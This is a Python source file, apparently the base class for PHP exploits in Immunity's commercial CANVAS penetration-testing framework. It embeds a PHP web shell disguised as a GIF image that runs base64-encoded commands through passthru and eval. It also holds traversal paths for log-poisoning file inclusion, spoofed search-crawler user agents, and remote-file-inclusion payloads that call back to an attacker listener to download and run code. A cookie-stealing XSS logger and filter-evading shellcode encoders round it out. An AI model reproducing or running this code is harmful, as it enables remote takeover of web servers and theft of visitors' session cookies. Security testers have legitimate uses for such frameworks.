#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  phpexploit.py
## Description:  
##            :  
## Created_On :  Thu Aug 13 10:55:18 2009
## Created_By :  Rich
## Modified_On:  
## Modified_By:  
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

"""
phpexploit.py
Most PHP exploits are the same.
"""

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from phplistener import get_php_stage1
import libs.spkproxy as spkproxy #for urlopen
from tcpexploit import tcpexploit
import canvasengine
import random
#import re

class phpexploit(canvasexploit):
    """
    Base class for all php exploits
    """
    def __init__(self):
        canvasexploit.__init__(self)
        #hostname="http://google.com"
        #elf.hostname=hostname
        self.ua=spkproxy.UserAgent("") #placeholder
        self.name=""
        #self.ssl=""
        self.webserverport=0 #set to non-zero to make it an RFI exploit

        self.shell=chr(0x47)+chr(0x49)+chr(0x46)+chr(0x38)+chr(0x39)+chr(0x61)+\
            chr(0x01)+chr(0x00)+chr(0x01)+chr(0x00)+chr(0xf7)+chr(0x00)+\
            chr(0x00)+chr(0xa4)+chr(0xb6)+chr(0xa4)+chr(0x16)+chr(0x00)+\
            chr(0x00)+chr(0xf4)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
            chr(0x00)+chr(0x6b)+chr(0x00)+chr(0x4c)+chr(0x15)+chr(0x00)+\
            chr(0x00)+chr(0xf4)+chr(0x00)+chr(0x69)+chr(0x77)+chr(0x00)+\
            chr(0x00)+chr(0xf8)+chr(0x00)+chr(0x6e)+chr(0x62)+chr(0x00)+\
            chr(0x00)+chr(0x15)+chr(0x00)+chr(0x67)+chr(0x00)+chr(0x00)+\
            chr(0x00)+chr(0x34)+chr(0x00)+chr(0x75)+chr(0x00)+chr(0x00)+\
            chr(0x00)+chr(0x00)+chr(0x00)+chr(0x61)+chr(0xc0)+chr(0x00)+\
            chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
            chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
            chr(0x00)+chr(0x89)+chr(0x00)+chr(0x00)+chr(0x1c)+chr(0x00)+\
            chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
            chr(0x00)+chr(0xa9)+chr(0x00)+chr(0x00)+chr(0x20)+chr(0x00)+\
            chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
            chr(0x00)+chr(0x6f)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
            chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
            chr(0x00)+chr(0x56)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
            chr(0x00)+\
            """<?php 
	    error_reporting(0);
	    ini_set('max_execution_time',0);
	    print 'startz';
	    passthru(base64_decode($_REQUEST[SERVER_INFO]));
	    eval(base64_decode($_REQUEST[SERVER_INFO2]));
	    print 'endz';
	    exit;
	    ?>"""+\
                 chr(0x38)+chr(0x00)+chr(0x00)+chr(0xe5)+chr(0x00)+\
                 chr(0x00)+chr(0x12)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x98)+chr(0x01)+chr(0x00)+\
                 chr(0xcc)+chr(0x00)+chr(0x00)+chr(0x15)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x58)+chr(0x00)+chr(0x10)+chr(0xe6)+chr(0x00)+\
                 chr(0x04)+chr(0x12)+chr(0x00)+chr(0x10)+chr(0x00)+chr(0x00)+\
                 chr(0x04)+chr(0x05)+chr(0x00)+chr(0x01)+chr(0x90)+chr(0x00)+\
                 chr(0x00)+chr(0xf6)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
                 chr(0x00)+chr(0xc8)+chr(0x00)+chr(0x10)+chr(0xd5)+chr(0x00)+\
                 chr(0xe8)+chr(0xf5)+chr(0x00)+chr(0x12)+chr(0x77)+chr(0x00)+\
                 chr(0x00)+chr(0xff)+chr(0x00)+chr(0x13)+chr(0xff)+chr(0x00)+\
                 chr(0x6c)+chr(0xff)+chr(0x00)+chr(0x6c)+chr(0xff)+chr(0x00)+\
                 chr(0x74)+chr(0x6a)+chr(0x00)+chr(0x03)+chr(0x16)+chr(0x00)+\
                 chr(0x00)+chr(0xf4)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
                 chr(0x00)+chr(0xc4)+chr(0x00)+chr(0x30)+chr(0x1e)+chr(0x00)+\
                 chr(0x75)+chr(0xe5)+chr(0x00)+chr(0x15)+chr(0x77)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x15)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0xdc)+chr(0x00)+chr(0x00)+\
                 chr(0xe7)+chr(0x00)+chr(0x00)+chr(0x12)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x70)+chr(0x00)+chr(0x01)+chr(0x59)+chr(0x00)+\
                 chr(0x00)+chr(0x18)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x04)+chr(0x00)+chr(0x88)+chr(0x01)+chr(0x00)+\
                 chr(0xe8)+chr(0x05)+chr(0x00)+chr(0x12)+chr(0x01)+chr(0x00)+\
                 chr(0x00)+chr(0x6c)+chr(0x00)+chr(0x04)+chr(0xe3)+chr(0x00)+\
                 chr(0x42)+chr(0x12)+chr(0x00)+chr(0x6e)+chr(0x00)+chr(0x00)+\
                 chr(0x74)+chr(0x7e)+chr(0x00)+chr(0x30)+chr(0x00)+chr(0x00)+\
                 chr(0x87)+chr(0x00)+chr(0x00)+chr(0x6e)+chr(0xc0)+chr(0x00)+\
                 chr(0x74)+chr(0x00)+chr(0x00)+chr(0xff)+chr(0x00)+chr(0x00)+\
                 chr(0xff)+chr(0x00)+chr(0x00)+chr(0xff)+chr(0x00)+chr(0x00)+\
                 chr(0xff)+chr(0xff)+chr(0x00)+chr(0xd6)+chr(0xff)+chr(0x00)+\
                 chr(0x32)+chr(0xff)+chr(0x00)+chr(0x6e)+chr(0xff)+chr(0x00)+\
                 chr(0x74)+chr(0xff)+chr(0x00)+chr(0x6c)+chr(0xff)+chr(0x00)+\
                 chr(0x5b)+chr(0xff)+chr(0x00)+chr(0xe5)+chr(0xff)+chr(0x00)+\
                 chr(0x77)+chr(0x00)+chr(0x00)+chr(0x53)+chr(0x00)+chr(0x00)+\
                 chr(0x15)+chr(0x00)+chr(0x00)+chr(0x53)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x07)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x6b)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x58)+chr(0x00)+chr(0x00)+chr(0x03)+chr(0x00)+\
                 chr(0xf0)+chr(0x00)+chr(0x00)+chr(0x15)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x06)+chr(0x00)+chr(0x00)+chr(0xf6)+chr(0x00)+\
                 chr(0x00)+chr(0xe4)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
                 chr(0x00)+chr(0x0f)+chr(0x00)+chr(0x00)+chr(0x1e)+chr(0x00)+\
                 chr(0x00)+chr(0xe5)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x01)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0xf8)+chr(0x74)+chr(0x00)+chr(0x62)+chr(0xe7)+\
                 chr(0x00)+chr(0x01)+chr(0x12)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0xc8)+chr(0x68)+chr(0x00)+chr(0x28)+\
                 chr(0x32)+chr(0x15)+chr(0xe5)+chr(0xe6)+chr(0x00)+chr(0x77)+\
                 chr(0x77)+chr(0xa4)+chr(0x00)+chr(0xff)+chr(0xe5)+chr(0x00)+\
                 chr(0xff)+chr(0x12)+chr(0x00)+chr(0xff)+chr(0x00)+chr(0x00)+\
                 chr(0xff)+chr(0x00)+chr(0x00)+chr(0x6c)+chr(0x00)+chr(0x00)+\
                 chr(0x5b)+chr(0x00)+chr(0x00)+chr(0xe5)+chr(0x00)+chr(0x00)+\
                 chr(0x77)+chr(0xfc)+chr(0xf8)+chr(0x36)+chr(0xf7)+chr(0x62)+\
                 chr(0x00)+chr(0x12)+chr(0x15)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x05)+chr(0x00)+chr(0x36)+chr(0x90)+chr(0x01)+\
                 chr(0x00)+chr(0xf6)+chr(0x00)+chr(0x00)+chr(0x77)+chr(0x00)+\
                 chr(0x00)+chr(0xc8)+chr(0x04)+chr(0xd8)+chr(0xd5)+chr(0x29)+\
                 chr(0xed)+chr(0xf5)+chr(0xe5)+chr(0x12)+chr(0x77)+chr(0x77)+\
                 chr(0x00)+chr(0xff)+chr(0x94)+chr(0xff)+chr(0xff)+chr(0xe7)+\
                 chr(0xff)+chr(0xff)+chr(0x12)+chr(0xff)+chr(0xff)+chr(0x00)+\
                 chr(0xff)+chr(0x6a)+chr(0x64)+chr(0x00)+chr(0x16)+chr(0x2f)+\
                 chr(0x00)+chr(0xf4)+chr(0xe6)+chr(0x00)+chr(0x77)+chr(0x77)+\
                 chr(0x00)+chr(0xe0)+chr(0x00)+chr(0x9c)+chr(0x18)+chr(0x00)+\
                 chr(0xe8)+chr(0xe5)+chr(0x00)+chr(0x12)+chr(0x77)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0xff)+chr(0x4e)+chr(0x00)+chr(0xff)+\
                 chr(0x21)+chr(0x15)+chr(0xff)+chr(0x4c)+chr(0x00)+chr(0xff)+\
                 chr(0x00)+chr(0x00)+chr(0x6f)+chr(0x7c)+chr(0x00)+chr(0x10)+\
                 chr(0xe8)+chr(0x00)+chr(0xe5)+chr(0x12)+chr(0x00)+chr(0x77)+\
                 chr(0x00)+chr(0xf8)+chr(0x00)+chr(0x7b)+chr(0x62)+chr(0x00)+\
                 chr(0xe0)+chr(0x15)+chr(0x00)+chr(0x4e)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x98)+chr(0xb0)+chr(0x01)+chr(0xe8)+\
                 chr(0xe8)+chr(0x00)+chr(0x12)+chr(0x12)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x64)+chr(0x98)+chr(0x6f)+chr(0x2f)+chr(0x10)+\
                 chr(0x10)+chr(0xe6)+chr(0xe5)+chr(0xe5)+chr(0x77)+chr(0x77)+\
                 chr(0x77)+chr(0x00)+chr(0x10)+chr(0x52)+chr(0x00)+chr(0xe4)+\
                 chr(0xe9)+chr(0x00)+chr(0x4e)+chr(0x12)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x61)+chr(0x20)+chr(0xc8)+chr(0x00)+chr(0x02)+\
                 chr(0xff)+chr(0x6c)+chr(0x4f)+chr(0xff)+chr(0x00)+chr(0x00)+\
                 chr(0x7f)+chr(0x69)+chr(0x00)+chr(0x1c)+chr(0x00)+chr(0x01)+\
                 chr(0xe9)+chr(0x61)+chr(0x00)+chr(0x12)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x29)+chr(0x94)+chr(0x00)+chr(0x00)+chr(0xe7)+\
                 chr(0x00)+chr(0x00)+chr(0x12)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x6f)+chr(0x00)+chr(0x01)+\
                 chr(0x10)+chr(0x00)+chr(0x00)+chr(0xe5)+chr(0x00)+chr(0x00)+\
                 chr(0x77)+chr(0x00)+chr(0xa0)+chr(0x00)+chr(0x00)+chr(0x3a)+\
                 chr(0x00)+chr(0x00)+chr(0x50)+chr(0x00)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x01)+chr(0x00)+chr(0x30)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x00)+chr(0x69)+\
                 chr(0x00)+chr(0x00)+chr(0x61)+chr(0x60)+chr(0x00)+chr(0x74)+\
                 chr(0xf1)+chr(0x00)+chr(0x74)+chr(0x15)+chr(0x00)+chr(0x69)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0xf0)+chr(0x00)+chr(0x00)+\
                 chr(0xaa)+chr(0x00)+chr(0x02)+chr(0x47)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x21)+chr(0xf9)+chr(0x04)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x00)+chr(0x2c)+chr(0x00)+chr(0x00)+\
                 chr(0x00)+chr(0x00)+chr(0x01)+chr(0x00)+chr(0x01)+chr(0x00)+\
                 chr(0x07)+chr(0x08)+chr(0x04)+chr(0x00)+chr(0x01)+chr(0x04)+\
                 chr(0x04)+chr(0x00)+chr(0x3b)+chr(0x00)

        self.log_paths = [
            "../../../../../../var/log/apache2/access.log",
            "../../../../../../var/log/apache2/error.log",
            "../../../../../var/log/apache2/access.log",
            "../../../../../var/log/apache2/error.log",
            "../../../../../var/log/httpd/access_log",
            "../../../../../var/log/httpd/error_log",
            "../apache/logs/error.log",
            "../apache/logs/access.log",
            "../../apache/logs/error.log",
            "../../apache/logs/access.log",
            "../../../apache/logs/error.log",
            "../../../apache/logs/access.log",
            "../../../../apache/logs/error.log",
            "../../../../apache/logs/access.log",
            "../../../../../apache/logs/error.log",
            "../../../../../apache/logs/access.log",
            "../logs/error.log",
            "../logs/access.log",
            "../../logs/error.log",
            "../../logs/access.log",
            "../../../logs/error.log",
            "../../../logs/access.log",
            "../../../../logs/error.log",
            "../../../../logs/access.log",
            "../../../../../logs/error.log",
            "../../../../../logs/access.log",
            "../../../../../etc/httpd/logs/access_log",
            "../../../../../etc/httpd/logs/access.log",
            "../../../../../etc/httpd/logs/error_log",
            "../../../../../etc/httpd/logs/error.log",
            "../../../../../var/www/logs/access_log",
            "../../../../../var/www/logs/access.log",
            "../../../../../usr/local/apache/logs/access_log",
            "../../../../../usr/local/apache/logs/access.log",
            "../../../../../var/log/apache/access_log",
            "../../../../../var/log/apache/access.log",
            "../../../../../var/log/access_log",
            "../../../../../var/www/logs/error_log",
            "../../../../../var/www/logs/error.log",
            "../../../../../usr/local/apache/logs/error_log",
            "../../../../../usr/local/apache/logs/error.log",
            "../../../../../var/log/apache/error_log",
            "../../../../../var/log/apache/error.log",
            "../../../../../var/log/access_log",
            "../../../../../var/log/error_log",
            "../../../../../../var/log/apache2/error.log"]

        self.useragents = [
            "Googlebot/2.1 ( http://www.google.com/bot.html)",
            "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
            "Mozilla/5.0 (X11; U; Linux x86; en-US; rv:1.8.1.6) Gecko/20061201 Firefox/2.0.0.6 (Ubuntu-feisty)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
            "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0)",
            "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en) AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5",
            "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/522.11.1 (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/523.2+ (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.7.5) Gecko/20070321 Netscape/8.1.3",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20070321 Netscape/9.0",
            "Opera/9.23 (Windows NT 5.0; U; en)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
            "Mozilla/4.8 [en] (Windows NT 6.0; U)",
            "Opera/9.20 (Windows NT 6.0; U; en)",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4",
            "Opera/9.20 (X11; Linux i686; U; en)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.4) Gecko/20060601 Firefox/2.0.0.4 (Ubuntu-edgy)",
            "Opera/9.10 (Windows NT 5.1; U; en)",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/522.11 (KHTML, like Gecko) Version/3.0.2 Safari/522.12",
            "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.3 (like Gecko)",
            "Mozilla/5.0 (X11; U; FreeBSD amd64; en-US; rv:1.8.1.4) Gecko/20070704 Firefox/2.0.0.4",
            "Opera/9.23 (X11; FreeBSD 6 i386; U; en)",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.5) Gecko/20070718 Fedora/2.0.0.5-1.fc7 Firefox/2.0.0.5"]

    def random_ua(self):
        """
        returns a random User-Agent
        """
        return random.choice(self.useragents)

    def addcookie(self, name, value):
        self.ua.SetCookie("name","value")
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions = {}
        self.versions[1] = [""]

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]


    def test(self):
        """
        Quicky banner check - looks for comon basepaths
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        self.log("Using vhost=%s"%self.hostname)
        self.log("Using Testfile=%s"%self.testfile)

        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        for hostname in self.allhosts:
            self.log("Testing hostname: %s"%hostname)

            #automatically check out some common basepaths, starting with the one specified
            for basepath in self.basepaths:
                self.log("Testing for basepath: %s"%basepath)

                #If we have to do basic-auth, let's get an object from spkproxy here
                if self.basicauth_user:
                    auth = spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
                else:
                    auth = None 

                #this is the main call that does the magic here...
                fd = spkproxy.urlopen(protocol+"://"+self.host+':%s'%self.port+basepath+self.testfile, hostname=hostname, exploit=self, auth=auth, extraheaders=[("User-Agent","Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)")])
                data = fd.read()

                #now that we have the web page - we parse it and look for vulnerable versions
                #list of vulnerable versions so far
                for s in self.foundstrings:
                    devlog("phpexploit","Data=%s"%data) #print out web page (big)
                    if s in data:
                        self.log("Found Potential vulnerable php app in vhost %s at basepath %s"%(hostname, basepath))
                        self.argsDict["basepath"] = basepath
                        self.basepath = basepath
                        self.hostname = hostname
                        self.version = 1
                        return 1
        return 0

    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)"%(self.name,self.host,self.port))
        self.log("Using version: %s"%self.version)
        if self.version==0:
            ret=self.test()
            if not ret:
                self.setInfo("%s against %s:%d (failed: didn't find vulnerable target!)"%(self.name,self.host,self.port))
                self.log("Testing didn't find vulnerable target")
                return 0
        if not self.hostname:
            self.hostname = self.host

        self.log("Attacking %s:%d"%(self.host,self.port))
        self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)

        #setup our UA first
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user:
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None

        targetstring=protocol+"://"+self.hostname+":"+str(self.port)+self.basepath
        self.log("Targetstring: %s"%targetstring)
        self.ua=spkproxy.UserAgent(targetstring, auth=auth, hostname=self.hostname, exploit=self)

        if hasattr(self, "content_type"):
            self.ua.addHeader("Content-Type", self.content_type)

        if self.webserverport:
            ret = self.set_up_webserver()
            if not ret:
                self.log('Could not start webserver, aborting..')
                return 0
                
            noresponse=True 

        # Testing may need to change if it mucks with anything..
        self.ua.addHeader("User-Agent",self.random_ua())


        noresponse=True 
        if self.command:
            #we do get the response if we are sending it a command
            noresponse=False 

        if self.verb=="POST":
            body=self.getbody()
            self.log("POSTING data of length %s"%len(body))
            data=self.ua.POST(self.targetpath, body, noresponse=noresponse) #fix noresponce in POST noresponse=noresponse
        elif self.verb=="GET": 
            data=self.ua.GET(self.targetpath+"?"+self.geturlarguments(), noresponse=noresponse)

        if self.command and data:
            blah=self.parse_command_response(data)

        if self.webserverport:
            #let's accept a connection if this is an RFI exploit
            #we should have timed out on the top connection
            ret=self.server.accept()
            if ret:
                self.log("Found callback to our web server: %s!"%ret)
        else:    
            self.log("Recved result of: %s"%data)

        ret=self.ISucceeded()

        return ret 

    def get_php_to_mosdef_rfi(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        if not self.callback:
            self.log("No callback specified! You need to specify a callback for this exploit!")
            return ""
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))
        #ret="touch /tmp/canvas" #tester
        from phplistener import get_php_stage1 #get our "Shellcode"

        #cannot use / in this code (theoretically)
        badchars="/"
        ret="<?php "+get_php_stage1(badchars,localhost,localport)+" ?>"
        self.log("Generated callback shell of: %s"%ret)
        return ret

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        if not self.callback:
            self.log("No callback specified! You need to specify a callback for this exploit!")
            return ""

        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))

        badchars="" #none for this one
        ret=get_php_stage1(badchars,localhost,localport)

        return ret

    def getxss_data(self):
        """
        add stuff to log xss requests
        """

        code = """<?
	$cookie = $_GET['cookie'];
	$handler = fopen('cookies.txt', 'a');
	fwrite($handler, $cookie."\n");
	?>
	"""

        return code

    def set_up_webserver(self):
        """
        Creates a webserver that always returns our php callback shell
        as any file you request from it
        """
        data=self.get_php_to_mosdef_rfi() # self.get_php_to_mosdef_rfi() or getxss_data() theoretically
        app=self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"]=self.webserverport 
        app.argsDict["singleexploit"]="upload"
        app.argsDict["sourcedata"]=data 
        ret=app.listen()
        self.server=app 
        return ret

    def mysql_conv(self, command):
        return "CHAR("+",".join( [ '%d' % ord(x) for x in list(command)])+")"

    def conv(self, command):
        return ".".join( [ 'chr(%d)' % ord(x) for x in list(command)])

    def encode_php(self, shellcode):
        """
        Encodes PHP shellcode to bypass weird restrictions sometimes in 
        place
        def conv(self, command):
        return ".".join( [ 'chr(%d)' % ord(x) for x in list(command)])

        """
        ret=[]
        flag = True
        for c in shellcode:
            if c in string.ascii_letters:
                ret.append( c )
                if not flag:
                    flag = True
            else:
                if flag:
                    ret.append( ".chr(%d)." % (ord(c)) )
                else:
                    ret.append( "chr(%d)." % (ord(c)) )
                flag = False

        buf = "".join(ret)
        if buf[-1] == '.':
            buf = buf[:-1]
        return buf

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.webserverport=int(self.argsDict.get("webserverport", self.webserverport))
        self.getarg("basepath")
        self.getarg("command")
        #self.getarg("bid") # for smf_csrf
        self.ssl=self.argsDict.get("ssl",self.ssl)
        self.getarg("user")
        self.getarg("password")
        self.getarg("basicauth_user")
        self.getarg("basicauth_password")
        self.getarg("hostname")
        self.getarg("testfile")
        if self.hostname in [None, ""]:
            allhosts=self.target.get_knowledge("www_hostnames")
            if allhosts==None:
                allhosts=["%s"%self.host]
        else:
            allhosts=[self.hostname]
        self.allhosts=allhosts

        return

    def set_up_smb_server(self):
        """
        never used but we still have it!
        """
        self.log("Starting smb server")
        mysmbserver=smbserver.SMBServer("0.0.0.0", 445)
        mysmbserver.set_file_data(self.phpfilename, self.get_php_to_mosdef()) #load the file data up
        mysmbserver.timeout=5
        if mysmbserver.listen() == 0:
            self.log("Could not listen!")
            return False 

        self.server=mysmbserver
        self.log("Accepting connections via SMB for files")
        return True

    def get_random_file(self, maxlength=6, filetype=".php"):
        """
        returns a random file name of maxlength characters
        """
        filechars    = list(string.uppercase+string.lowercase+string.digits)
        filelen      = random.randrange(2,maxlength)
        filename  = "".join(random.sample(filechars, filelen))
        filename += filetype

        return filename

